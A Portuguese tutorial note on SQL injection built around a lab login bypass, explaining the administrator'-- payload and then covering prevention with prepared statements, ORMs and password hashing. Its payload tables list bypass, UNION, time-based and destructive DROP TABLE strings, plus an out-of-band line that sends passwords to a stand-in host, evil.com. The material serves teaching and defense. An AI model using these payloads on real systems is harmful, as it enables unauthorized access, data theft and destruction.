## 📖 O que é SQL Injection?

> **SQL Injection (SQLi)** é uma vulnerabilidade que ocorre quando dados fornecidos pelo usuário são **concatenados diretamente** numa consulta SQL, permitindo que o atacante **modifique a estrutura** da consulta.

### Analogia simples

Imagine um formulário de busca como um garçom anotando seu pedido:

```
Pedido normal:
  "Quero uma pizza de calabresa"
  → Garçom anota: PIZZA(calabresa)

Pedido com injection:
  "Quero uma pizza de calabresa. E também leve a caixa registradora."
  → Garçom anota: PIZZA(calabresa); ROUBAR(caixa)
```

O problema: o "garçom" (aplicação) não distingue **dados** ("calabresa") de **comandos** ("ROUBAR"). Quando você concatena strings, tudo vira código executável.

## 🧠 Por que Funciona? — Anatomia do Ataque

### A query vulnerável (no servidor)

O backend constrói o SQL **concatenando** o input do usuário:

```javascript
// Pseudocódigo do servidor vulnerável
const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
db.execute(query);
```

### Com input normal

Se você digitar `wiener` / `peter`:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'peter'
```

A query devolve o usuário **se** as duas condições forem verdadeiras. Comportamento esperado.

### Com input malicioso (`administrator'--`)

Substituindo no template:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '123'
```

Agora vem o truque:

```sql
SELECT * FROM users WHERE username = 'administrator'-- ' AND password = '123'
                                                     ↑
                                          tudo a partir daqui vira COMENTÁRIO
```

### A query realmente executada

Após o SQL ignorar o comentário, ela vira:

```sql
SELECT * FROM users WHERE username = 'administrator'
```

🎯 **A condição da senha foi totalmente removida.** A query só verifica o username. O servidor encontra o registro `administrator` e te loga.

## 🔍 Os 3 Pilares do Ataque

Toda SQL Injection clássica explora 3 elementos:

### 1️⃣ Aspas simples (`'`) → Encerrar a string do input

```sql
WHERE username = 'administrator'
                                ↑
                  o ' fecha a string aberta pelo servidor
```

### 2️⃣ Comentário (`--`, `#` ou `/* */`) → Anular o resto da query

| SGBD | Comentário de linha |
|------|---------------------|
| MySQL | `-- ` (com espaço) ou `#` |
| PostgreSQL | `--` |
| SQL Server | `--` |
| Oracle | `--` |

### 3️⃣ Conhecer (ou adivinhar) o nome do usuário-alvo

Nomes comuns para tentar:
- `administrator`
- `admin`
- `root`
- `superuser`
- `sa` (SQL Server)
- `system`

## 🎨 Variações Comuns do Ataque

Mesma ideia, payloads diferentes:

| Payload | O que faz |
|---------|-----------|
| `administrator'--` | Comenta o resto (este lab) |
| `' OR '1'='1` | Força a condição a ser sempre verdadeira |
| `' OR 1=1--` | Versão mais curta e clássica |
| `admin' /*` | Comentário multi-linha (anula até `*/`) |
| `' UNION SELECT NULL--` | Início de **UNION-based SQLi** |
| `'; DROP TABLE users--` | **Stacked queries** (raro, mas possível) |

## 📊 Os Tipos de SQL Injection

| Tipo | Como funciona | Exemplo |
|------|--------------|---------|
| **In-band (clássica)** | Resposta da query volta na mesma resposta HTTP | Login bypass com `' OR 1=1` |
| **Error-based** | Faz a aplicação **vazar erros** que revelam o schema | `'` que causa erro `Unknown column...` |
| **Union-based** | Usa `UNION SELECT` para extrair dados de outras tabelas | `' UNION SELECT username,password FROM users--` |
| **Blind** | Sem resposta visível — inferência por **booleano** | `' AND 1=1--` (página normal) vs `' AND 1=2--` (diferente) |
| **Time-based blind** | Sem resposta visível — inferência por **tempo** | `' AND SLEEP(5)--` (servidor demora 5s) |
| **Out-of-band** | Extrai dados via **DNS/HTTP** para servidor controlado | `' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users),'.evil.com'))--` |

> 💡 Este lab é **in-band clássica** — a mais simples e didática.

## 🛡️ Como Prevenir SQL Injection

### ❌ Errado (vulnerável)

```javascript
// Concatenação direta — NUNCA fazer isso
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.execute(query);
```

### ✅ Certo 1: Prepared Statements (parametrização)

```javascript
// Node.js + mysql2
const [rows] = await db.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]
);
```

**Por que funciona?**
O `?` não é só substituição de string — é um **placeholder real** enviado **separadamente** do template para o banco. O banco entende que `username` é **dado**, não código. Nem que você envie `'; DROP TABLE users--`, ele trata isso como um nome de usuário literal (que, claro, não existe).

### ✅ Certo 2: ORM com binding automático

```javascript
// Sequelize
const user = await User.findOne({
  where: { username, password }   // Sequelize parametriza automaticamente
});

// Prisma
const user = await prisma.user.findFirst({
  where: { username, password }
});
```

### ✅ Certo 3: Stored Procedures (com cuidado)

```sql
-- Definição segura no banco
CREATE PROCEDURE login(IN p_username VARCHAR(50), IN p_password VARCHAR(255))
BEGIN
  SELECT * FROM users WHERE username = p_username AND password = p_password;
END;
```

⚠️ Stored procedures **não são automaticamente seguras** — se usarem `EXEC` com concatenação dentro, voltam a ser vulneráveis.

### 🔒 Defesa em profundidade (combine tudo)

| Camada | Prática |
|--------|---------|
| **Código** | Prepared statements, ORM, validação de input |
| **Banco** | Conta de aplicação com **menor privilégio** (sem `DROP`, `ALTER`) |
| **Hash de senha** | Mesmo que vazem, `bcrypt`/`Argon2` evita exposição direta |
| **WAF** | Bloqueia payloads conhecidos (não substitui código seguro) |
| **Logs** | Detectar tentativas (caracteres `'`, `--`, `UNION` no input) |
| **Rate limit** | Dificulta blind/time-based que precisam de muitas requisições |

## ❌ Anti-Padrão Adicional Neste Lab

Olhando a query do lab, ainda há **outro problema grave**:

```sql
WHERE password = '123'
```

🚨 **A senha está sendo comparada em texto plano!** Isso significa que o banco armazena senhas **sem hash**.

A query correta seria algo como:

```javascript
const user = await db.execute(
  'SELECT id, role FROM users WHERE username = ?',
  [username]
);

if (user && await bcrypt.compare(password, user.passwordHash)) {
  // login OK
}
```

Note que:
- A query **só recebe `username`** (separação de busca e validação)
- A comparação de senha é feita **na aplicação**, com `bcrypt.compare`
- O banco nunca vê a senha em claro

> 🔗 **Conexão com OWASP:** essa parte é **A02 — Cryptographic Failures** (já vimos em [47.md](47.md)).

## 🧠 Conceitos Aprendidos

| Termo | Definição |
|-------|-----------|
| **SQL Injection (SQLi)** | Inserir comandos SQL no input do usuário |
| **Concatenação** | Construir query juntando strings — anti-padrão |
| **Prepared Statement** | Query parametrizada onde dados e código viajam separados |
| **Binding** | Associação segura de valores aos placeholders |
| **ORM** | Object-Relational Mapper — abstração de SQL com binding automático |
| **Login Bypass** | Pular autenticação sem credenciais válidas |
| **Stacked Queries** | Executar múltiplas queries separadas por `;` |
| **UNION-based** | Usar `UNION SELECT` para extrair dados de outras tabelas |
| **Blind SQLi** | Sem resposta visível — inferência por boolean ou tempo |
| **Defense in Depth** | Múltiplas camadas de proteção |

## ✅ Quiz Mental

1. Por que o `--` no payload `administrator'--` é importante?
2. Qual é a diferença entre **SQL Injection in-band** e **blind**?
3. Por que `' OR '1'='1` funcionaria também neste lab?
4. Prepared statements eliminam SQL Injection. Por quê?
5. Qual é o **outro problema grave** da query vulnerável deste lab além da SQLi?

<details>
<summary>Ver respostas</summary>

1. O `--` transforma o restante da query em **comentário**, eliminando a verificação de senha
2. **In-band:** a resposta da query volta na resposta HTTP normal. **Blind:** o atacante infere o resultado por comportamento (página diferente, tempo de resposta)
3. Porque `'1'='1'` é sempre **TRUE** — a cláusula vira `WHERE username = '' OR '1'='1' AND ...` e qualquer linha satisfaz a condição
4. Porque o **dado** trafega separado do **template**. O banco sabe que `?` é dado, não código — mesmo `'; DROP TABLE--` é tratado como texto literal
5. **Senha em texto plano** — deveria estar com `bcrypt`/`Argon2`. É também **A02 — Cryptographic Failures** ([47.md](47.md))

</details>

## ⚖️ Importância Histórica

> A vulnerabilidade de SQL Injection, até o momento atual, **sempre esteve no Top 10 da OWASP** desde sua primeira edição em 2003. Em 2021, ocupa o **terceiro lugar** (categoria A03 — Injection).

**Casos famosos:**
- **Sony Pictures (2011)** — SQLi expôs 1 milhão de contas
- **TalkTalk UK (2015)** — SQLi vazou 157 mil clientes; multa de £400k
- **Heartland Payment Systems (2008)** — SQLi roubou 130 milhões de cartões
- **Yahoo Voices (2012)** — SQLi vazou 450 mil senhas em texto plano

A lição não envelhece: **toda concatenação de string em SQL é uma porta aberta.**

## 💡 Reflexão Final

> *"SQL Injection existe há mais de 25 anos. Continua no Top 10 da OWASP.*
> *Não porque seja difícil de prevenir — prepared statements resolvem 99% dos casos.*
> *Mas porque cada novo desenvolvedor, mais cedo ou mais tarde, escreve a primeira concatenação.*
> *E é sempre a primeira coisa que um atacante testa."*

A regra é simples e absoluta:

> 🔑 **Nunca concatene input do usuário em SQL. Sempre use prepared statements.**
